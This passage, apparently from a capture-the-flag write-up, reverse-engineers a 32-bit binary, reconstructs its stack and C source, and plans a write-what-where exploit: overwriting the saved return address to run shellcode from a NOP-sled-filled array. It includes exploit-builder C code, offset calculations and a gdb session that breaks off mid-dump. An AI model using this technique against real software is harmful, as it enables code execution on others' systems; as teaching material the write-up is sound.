   <span class="err">0</span><span class="nf">x080486bc</span> <span class="o">&lt;+</span><span class="mi">324</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">je</span>     <span class="mh">0x80486c3</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">331</span><span class="o">&gt;</span>

   <span class="err">0</span><span class="nf">x080486be</span> <span class="o">&lt;+</span><span class="mi">326</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">call</span>   <span class="mh">0x8048444</span> <span class="o">&lt;</span><span class="nv">__stack_chk_fail@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x080486c3</span> <span class="o">&lt;+</span><span class="mi">331</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">leave</span> 
   <span class="err">0</span><span class="nf">x080486c4</span> <span class="o">&lt;+</span><span class="mi">332</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">ret</span>   
<span class="nf">End</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">dump.</span>
</pre></td></tr></tbody></table></code></pre></figure>

<p>We basically have a main() which read the file with fgets() and use atoll()
in an insert function.</p>

<p>We can reconstruct the stack also. We can see in the code that ESP is used but
it is not convenient for calculating sizes.
We get the following stack values in the end for main():</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="code"><pre>esp+0x2c        &lt;-&gt; ebp-0x1050+0x2c-0x8 = ebp-0x102c    ; value2
esp+0x30        &lt;-&gt; ebp-0x1050+0x30-0x8 = ebp-0x1028    ; value1
esp+0x34        &lt;-&gt; ebp-0x1050+0x34-0x8 = ebp-0x1024    ; fp
esp+0x38        &lt;-&gt; ebp-0x1050+0x38-0x8 = ebp-0x1020    ; buffer (0x1000 = 4096 bytes)
esp+0x1038      &lt;-&gt; ebp-0x1050+0x1038-0x8 = ebp-0x20    ; sbuffer (0x14 = 20 bytes)
esp+0x104c      &lt;-&gt; ebp-0x1050+0x104c-0x8 = ebp-0xc     ; stack cookie
</pre></td></tr></tbody></table></code></pre></figure>

<p>Don’t forget -0x8 which correspond to seip and sebp ;).
sbuffer is a temporary buffer which is used by fgets().
value1 and value2 are integers converted from sbuffer through atoll().
fp is the file pointer used for referencing the file.</p>

<p>Having all the values, we can reconstruct the stack properly:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="code"><pre>            STACK TOP = LOW ADDRESSES

            esp         |   arg0
            esp+0x4     |   arg1
        ^   esp+0x8     |   arg2                |
        |   ebp-0x102c  |   value2              |
        |   ebp-0x1028  |   value1              |
  PUSH  |   ebp-0x1024  |   fp                  |   POP
        |   ebp-0x1020  |   buffer              |
        |           .....                       |
        |   ebp-0x20    |   end buffer          |
        |   ebp-0x20    |   sbuffer             V
            ebp-0xc     |   stack cookie
            ebp         |   sebp
            ebp+0x4-blog     |   seip
            ebp+0x8     |   argc
            ebp+0xc     |   argv

            STACK BOTTOM = HIGH ADDRESSES
</pre></td></tr></tbody></table></code></pre></figure>

<p>Following the ASM, the main should look something like this:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="code"><pre><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">value1</span><span class="p">,</span> <span class="n">value2</span><span class="p">;</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">4096</span><span class="p">],</span> <span class="n">sbuffer</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span> <span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s"> Usage:%s &lt;file&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">memset</span> <span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>

    <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span> <span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">"r"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">while</span> <span class="p">(</span><span class="n">fgets</span> <span class="p">(</span><span class="n">sbuffer</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="n">fp</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">value1</span> <span class="o">=</span> <span class="n">atoll</span> <span class="p">(</span><span class="n">sbuffer</span><span class="p">);</span>
        <span class="n">fgets</span> <span class="p">(</span><span class="n">sbuffer</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
        <span class="n">value2</span> <span class="o">=</span> <span class="n">atoll</span> <span class="p">(</span><span class="n">sbuffer</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">value1</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">value2</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
            <span class="n">insert</span> <span class="p">(</span><span class="n">value2</span><span class="p">,</span> <span class="n">value1</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></figure>

<p>The file is basically structured as a sequence of string values:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre>value1 | value2 | value1 | value2 | .... | value1 | value2
</pre></td></tr></tbody></table></code></pre></figure>

<p>Don’t forget that atoll() only convert leading characters [0-9]+ to an integer,
any following characters that are not numbers are not converted.</p>

<p>Now onto insert reversing:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="code"><pre><span class="nf">Dump</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">code</span> <span class="nv">for</span> <span class="nv">function</span> <span class="nv">insert</span><span class="p">:</span>
   <span class="err">0</span><span class="nf">x08048534</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">push</span>   <span class="nb">ebp</span>
   <span class="err">0</span><span class="nf">x08048535</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">ebp</span><span class="p">,</span><span class="nb">esp</span>
   <span class="err">0</span><span class="nf">x08048537</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x28</span>
   <span class="err">0</span><span class="nf">x0804853a</span> <span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">]</span>              <span class="c1">; eax = value2</span>
   <span class="err">0</span><span class="nf">x0804853d</span> <span class="o">&lt;+</span><span class="mi">9</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x1c</span><span class="p">],</span><span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x08048540</span> <span class="o">&lt;+</span><span class="mi">12</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">]</span>              <span class="c1">; eax = value1</span>
   <span class="err">0</span><span class="nf">x08048543</span> <span class="o">&lt;+</span><span class="mi">15</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x20</span><span class="p">],</span><span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x08048546</span> <span class="o">&lt;+</span><span class="mi">18</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="mh">0x10</span><span class="p">]</span>             <span class="c1">; eax = buffer</span>
   <span class="err">0</span><span class="nf">x08048549</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x24</span><span class="p">],</span><span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x0804854c</span> <span class="o">&lt;+</span><span class="mi">24</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="nb">gs</span><span class="p">:</span><span class="mh">0x14</span>                          <span class="c1">; stack cookie</span>
   <span class="err">0</span><span class="nf">x08048552</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">],</span><span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x08048555</span> <span class="o">&lt;+</span><span class="mi">33</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">xor</span>    <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x08048557</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x1c</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x0804855a</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">shl</span>    <span class="nb">eax</span><span class="p">,</span><span class="mh">0x2</span>                              <span class="c1">; value2 &lt;&lt;= 2;</span>
   <span class="err">0</span><span class="nf">x0804855d</span> <span class="o">&lt;+</span><span class="mi">41</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">add</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x24</span><span class="p">]</span>             <span class="c1">; value2 += buffer;</span>
   <span class="err">0</span><span class="nf">x08048560</span> <span class="o">&lt;+</span><span class="mi">44</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">edx</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x20</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x08048563</span> <span class="o">&lt;+</span><span class="mi">47</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">eax</span><span class="p">],</span><span class="nb">edx</span>                  <span class="c1">; *value2 = value1;</span>
   <span class="c1">; stack cookie check</span>
   <span class="err">0</span><span class="nf">x08048565</span> <span class="o">&lt;+</span><span class="mi">49</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">]</span>              <span class="c1">; stack cookie</span>
   <span class="err">0</span><span class="nf">x08048568</span> <span class="o">&lt;+</span><span class="mi">52</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">xor</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="nb">gs</span><span class="p">:</span><span class="mh">0x14</span>
   <span class="err">0</span><span class="nf">x0804856f</span> <span class="o">&lt;+</span><span class="mi">59</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">je</span>     <span class="mh">0x8048576</span> <span class="o">&lt;</span><span class="nv">insert</span><span class="o">+</span><span class="mi">66</span><span class="o">&gt;</span>

   <span class="err">0</span><span class="nf">x08048571</span> <span class="o">&lt;+</span><span class="mi">61</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">call</span>   <span class="mh">0x8048444</span> <span class="o">&lt;</span><span class="nv">__stack_chk_fail@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x08048576</span> <span class="o">&lt;+</span><span class="mi">66</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">leave</span> 
   <span class="err">0</span><span class="nf">x08048577</span> <span class="o">&lt;+</span><span class="mi">67</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">ret</span>   
<span class="nf">End</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">dump.</span>
</pre></td></tr></tbody></table></code></pre></figure>

<p>We thus have the following stack for insert():</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="code"><pre>            STACK TOP = LOW ADDRESSES

            esp
        ^   ebp-0x24    |   buffer          |
        |   ebp-0x20    |   value1          |
  PUSH  |   ebp-0x1c    |   value2          |   POP
        |   ebp-0xc     |   stack cookie    V
            ebp         |   sebp
            ebp+0x4     |   seip
            ebp+0x8     |   offset
            ebp+0xc     |   value
            ebp+0x10    |   buffer

            STACK BOTTOM = HIGH ADDRESSES
</pre></td></tr></tbody></table></code></pre></figure>

<p>The interesting code is between 0x804855a and 0x8048563, the rest is mostly
setting up stuffs.</p>

<p>From this code we can infer that:</p>

<ul>
  <li>buffer is in fact an array of integers (due to shl eax, 0x2 which is equal to x4)</li>
  <li>value2 is an offset</li>
  <li>value1 is a value to insert</li>
  <li>no return as eax value is not properly re-initialized</li>
</ul>

<p>So it is equivalent to the following code:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="code"><pre><span class="kt">void</span> <span class="nf">insert</span> <span class="p">(</span><span class="kt">int</span> <span class="n">offset</span><span class="p">,</span> <span class="kt">int</span> <span class="n">value</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">array</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">array</span><span class="p">[</span><span class="n">offset</span><span class="p">]</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></figure>

<p>So we can basically write an arbitrary value anywhere we want: a so called
“write-what-where”.</p>

<p>This basically allow us to easily bypass the stack cookie.</p>

<p>Time for exploitation.</p>

<h1 id="exploiting-a-write-what-where">Exploiting a write-what-where</h1>

<p>We first need to know what to write, there are multiple possibilities:</p>

<ul>
  <li>SEIP (return to code)</li>
  <li>SEBP (then craft a fake stack frame and all necessary stuffs)</li>
  <li>atexit destructors</li>
  <li>DYNAMIC FINI</li>
  <li>GOT entry</li>
  <li>etc</li>
</ul>

<p>Since this is a write-what-where and we want a reliable exploit, the
__stack_chk_fail GOT entry would have been a nice target.</p>

<p>Unlucky for us: RELRO so no way.</p>

<p>We will target a stack address as the buffer address is on the stack and we
control an offset. It will be more reliable than targeting an address in the
binary (stack randomization could make the offset change between 0x804…. and
stack addresses). SEIP is the obvious candidate here.</p>

<p>Since we would like to trigger our payload as soon as possible, insert() SEIP
is the target.</p>

<p>Second condition: we need a place for our shellcode!</p>

<p>We’ll “simply” inject it through our “integers array”. There is plenty of room
(0x1000 = 4096 bytes!).</p>

<p>Secondly, good news: no NX, so no need for ROP here.</p>

<p>Given that our shellcode is around 22-50 bytes, we get at least 4000 NOPs for
our NOPsled.</p>

<p>Ok, now we have the theory, let’s resolve that challenge!</p>

<h1 id="exploitation">Exploitation</h1>

<p>In our previous section, our exploit reflexion was as follow:</p>

<ul>
  <li>fill integer array with shellcode</li>
  <li>activate payload by overwriting insert() SEIP</li>
</ul>

<p>The following snippets of code is in charge of filling the array:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
</pre></td><td class="code"><pre><span class="kt">int</span> <span class="nf">get_fsize</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">sz_file</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">old_offset</span><span class="p">;</span>

    <span class="n">old_offset</span> <span class="o">=</span> <span class="n">ftell</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
    <span class="n">fseek</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SEEK_END</span><span class="p">);</span>
    <span class="n">sz_file</span> <span class="o">=</span> <span class="n">ftell</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
    <span class="n">fseek</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">old_offset</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">sz_file</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// integer to ascii</span>
<span class="kt">char</span> <span class="o">*</span><span class="nf">i2a</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">intstr</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">len_intstr</span><span class="p">;</span>

    <span class="n">intstr</span> <span class="o">=</span> <span class="n">calloc</span> <span class="p">(</span><span class="mi">21</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">intstr</span><span class="p">));</span>
    <span class="n">memset</span> <span class="p">(</span><span class="n">intstr</span><span class="p">,</span> <span class="sc">'a'</span><span class="p">,</span> <span class="mi">19</span><span class="p">);</span>
    <span class="n">snprintf</span> <span class="p">(</span><span class="n">intstr</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="s">"%d"</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
    <span class="n">len_intstr</span> <span class="o">=</span> <span class="n">strlen</span> <span class="p">(</span><span class="n">intstr</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">intstr</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">intstr</span><span class="p">[</span><span class="n">len_intstr</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'a'</span><span class="p">;</span>

    <span class="k">return</span> <span class="n">intstr</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">struct</span> <span class="n">dpatch_t</span> <span class="o">*</span><span class="nf">fill_array</span> <span class="p">(</span><span class="k">struct</span> <span class="n">dpatch_t</span> <span class="o">*</span><span class="n">array</span><span class="p">,</span> <span class="kt">int</span> <span class="n">n_elts</span><span class="p">,</span> <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// buffer</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
    <span class="c1">// loop</span>
    <span class="kt">int</span> <span class="n">idx_array</span><span class="p">,</span> <span class="n">idx_buffer</span><span class="p">;</span> 
    <span class="kt">int</span> <span class="n">sz_file</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">rest</span><span class="p">;</span>

    <span class="n">sz_file</span> <span class="o">=</span> <span class="n">get_fsize</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
    <span class="n">rest</span> <span class="o">=</span> <span class="n">sz_file</span> <span class="o">%</span> <span class="mi">4</span><span class="p">;</span>

    <span class="c1">// alloc buffer</span>
    <span class="n">buffer</span> <span class="o">=</span> <span class="n">calloc</span> <span class="p">(</span><span class="n">sz_file</span> <span class="o">+</span> <span class="p">(</span><span class="n">rest</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">?</span> <span class="mi">4</span> <span class="o">:</span> <span class="mi">0</span><span class="p">),</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">buffer</span><span class="p">));</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">buffer</span><span class="p">)</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="c1">// read</span>
    <span class="n">fseek</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
    <span class="n">fread</span> <span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">sz_file</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>

    <span class="c1">// construct array</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">idx_array</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">idx_buffer</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">idx_array</span> <span class="o">&lt;</span> <span class="n">n_elts</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="n">idx_array</span><span class="o">++</span><span class="p">,</span> <span class="n">idx_buffer</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">array</span><span class="p">[</span><span class="n">idx_array</span><span class="p">].</span><span class="n">value</span> <span class="o">=</span> <span class="n">i2a</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="kt">uint32_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">buffer</span> <span class="o">+</span> <span class="n">idx_buffer</span><span class="p">));</span>
        <span class="n">array</span><span class="p">[</span><span class="n">idx_array</span><span class="p">].</span><span class="n">offset</span> <span class="o">=</span> <span class="n">i2a</span> <span class="p">(</span><span class="n">idx_buffer</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">free</span> <span class="p">(</span><span class="n">buffer</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">array</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></figure>

<p>Now we need to activate our payload through the vulnerability trigger.
We need to compute our insert() SEIP offset.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="code"><pre>ESP (insert) = ESP (main) - 0x4 (SEIP offset) - 0x4 (SEBP offset) - 0x28
             = EBP (main) - 0x1050 - 0x4 - 0x4 - 0x28
             = EBP (main) - 0x1080
EBP (insert) = ESP (main) - 0x4 (SEIP offset) - 0x4 (SEBP offset)
             = EBP (main) - 0x1050 - 0x4 - 0x4
             = EBP (main) - 0x1058

seip (insert) = buffer - (EBP (insert) + 0x4)
              = (EBP (main) - 0x1020) - (EBP (main) - 0x1058 + 0x4)
              = 0x3c
</pre></td></tr></tbody></table></code></pre></figure>

<p>Ok, we got 0x3c (60) bytes upper on the stack and lower in memory.
So we basically are going to create an underflow.
Since there seems to be only unsigned integers but multiplied by 0x4. We need
to have “real” value:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre>3c = 15 * 4
</pre></td></tr></tbody></table></code></pre></figure>

<p>Ok we got our offset, what about our value to insert?</p>

<p>We can avoid guessing the 4 bytes of the address.
We can do that by overwriting only 2 last bytes of insert() SEIP (it would
thus junk 2 bytes afterward but we don’t really care about those).
Since we multiply by 4, this technique is not possible (it has to be a
multiple of 4).</p>

<p>There is an actual better solution.</p>

<p>Remember our insert() stack?</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="code"><pre>            STACK TOP = LOW ADDRESSES

            esp
        ^   ebp-0x24    |   buffer          |
        |   ebp-0x20    |   value1          |
  PUSH  |   ebp-0x1c    |   value2          |   POP
        |   ebp-0xc     |   stack cookie    V
            ebp         |   sebp
            ebp+0x4     |   seip
            ebp+0x8     |   offset
            ebp+0xc     |   value
            ebp+0x10    |   buffer

            STACK BOTTOM = HIGH ADDRESSES
</pre></td></tr></tbody></table></code></pre></figure>

<p>We have buffer address laying on the stack!
We may be able to reuse it :).</p>

<p>Let’s check:</p>

<p>We’re going to break on:</p>

<ul>
  <li>0x0804867d &lt;main+261&gt; : call 0x8048534 <insert></insert></li>
  <li>0x08048577 &lt;insert+67&gt;: ret</li>
</ul>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
</pre></td><td class="code"><pre>gdb<span class="nv">$ </span>b <span class="k">*</span>0x0804867d
gdb<span class="nv">$ </span>b <span class="k">*</span>0x08048577
gdb<span class="nv">$ </span>r /tmp/test.txt
<span class="nt">--------------------------------------------------------------------------</span><span class="o">[</span>regs]
  EAX: FFFFFFF1  EBX: 9CB15E54  ECX: 00000001  EDX: FFFFFFFF  o d I t S z a p c 
  ESI: 00000000  EDI: 00000000  EBP: B3D36E58  ESP: B3D35E00  EIP: 0804867D
  CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
<span class="o">[</span>007B:B3D35E00]----------------------------------------------------------[stack]
B3D35E50 : 00 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
B3D35E40 : 00 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
B3D35E30 : 00 E8 76 48  C8 61 05 08 - 00 00 00 00  00 00 00 00 ..vH.a..........
B3D35E20 : 00 00 00 00  00 00 00 00 - 00 00 00 00  F1 FF FF FF ................
B3D35E10 : 00 00 00 00  00 00 00 00 - 04 6F D3 B3  02 00 00 00 .........o......
B3D35E00 : F1 FF FF FF  00 E8 76 48 - 38 5E D3 B3  00 00 00 00 ......vH8^......
<span class="o">[</span>007B:B3D35E00]-----------------------------------------------------------[data]
B3D35E00 : F1 FF FF FF  00 E8 76 48 - 38 5E D3 B3  00 00 00 00 ......vH8^......
B3D35E10 : 00 00 00 00  00 00 00 00 - 04 6F D3 B3  02 00 00 00 .........o......
B3D35E20 : 00 00 00 00  00 00 00 00 - 00 00 00 00  F1 FF FF FF ................
B3D35E30 : 00 E8 76 48  C8 61 05 08 - 00 00 00 00  00 00 00 00 ..vH.a..........
B3D35E40 : 00 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
B3D35E50 : 00 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
B3D35E60 : 00 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
B3D35E70 : 00 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
<span class="o">[</span>0073:0804867D]-----------------------------------------------------------[code]
<span class="o">=&gt;</span> 0x804867d &lt;main+261&gt;:    call   0x8048534 &lt;insert&gt;
   0x8048682 &lt;main+266&gt;:    mov    eax,DWORD PTR <span class="o">[</span>esp+0x34]
